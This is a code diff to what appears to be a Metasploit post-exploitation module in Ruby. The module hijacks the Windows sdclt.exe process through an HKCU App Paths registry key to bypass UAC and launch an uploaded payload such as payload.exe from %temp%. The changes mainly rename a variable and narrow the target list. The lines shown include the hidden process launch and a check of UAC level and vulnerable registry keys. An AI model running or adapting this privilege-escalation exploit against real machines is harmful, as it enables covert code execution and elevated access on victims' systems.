@@ -47,7 +47,7 @@
 # Input the payload name to be uploaded           => set PAYLOAD_NAME payload.exe
 # The destination path were to deploy payload     => set DEPLOY_PATH %temp%
 # The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
-# The vulnerable software to be hijacked ()?      => set VULN_SOFT sdclt.exe | Magnifier.exe | osk.exe | Narrator.exe
+# The vulnerable software to be hijacked ()?      => set VULN_SOFT sdclt.exe
 # Check target vulnerability settings/status?     => set CHECK_VULN true
 # Delete malicious registry hive keys/values?     => set DEL_REGKEY true
 #
@@ -175,7 +175,7 @@ def ls_hijack
 
   r=''
   session = client
-  vul_soft = datastore['VULN_SOFT'] # sdclt.exe
+  hija_soft = datastore['VULN_SOFT'] # sdclt.exe
   upl_path = datastore['LOCAL_PATH'] # /root/payload.exe
   dep_path = datastore['DEPLOY_PATH'] # %temp%
   pay_name = datastore['PAYLOAD_NAME'] # payload.exe
@@ -191,7 +191,7 @@ def ls_hijack
     print_warning("Please set DEPLOY_PATH | LOCAL_PATH | PAYLOAD_NAME options!")
     return nil
   else
-    print_status("Hijacking #{vul_soft} process!")
+    print_status("Hijacking #{hija_soft} process!")
     Rex::sleep(1.5)
   end
 
@@ -262,7 +262,7 @@ def ls_hijack
       # Start remote service to gain code execution ..
       #
       print_good(" exec => Starting sdclt.exe native process ..")
-      r = session.sys.process.execute("cmd.exe /c start #{vul_soft}", nil, {'Hidden' => true, 'Channelized' => true})
+      r = session.sys.process.execute("cmd.exe /c start #{hija_soft}", nil, {'Hidden' => true, 'Channelized' => true})
       Rex::sleep(0.5)
 
     # close channel when done
@@ -349,7 +349,7 @@ def ls_vulncheck
   r=''
   session = client
   oscheck = client.fs.file.expand_path("%OS%")
-  vul_soft = datastore['VULN_SOFT'] # sdclt.exe
+  hija_soft = datastore['VULN_SOFT'] # sdclt.exe
   uac_level = "ConsentPromptBehaviorAdmin" # uac level key
   uac_hivek = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" # uac hive key
   vuln_stats = "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe" # hijacking reg key
@@ -404,7 +404,7 @@ def ls_vulncheck
   # I hope you are smart enouth to recognise a vulnerable output :D
   #
   print_line("")
-  print_line("VULNERABLE_SOFT : #{vul_soft}")
+  print_line("VULNERABLE_SOFT : #{hija_soft}")
   print_line("    TARGET_OS   : #{oscheck}")
   print_line("    UAC_LEVEL   : #{report_level}")
   print_line("")
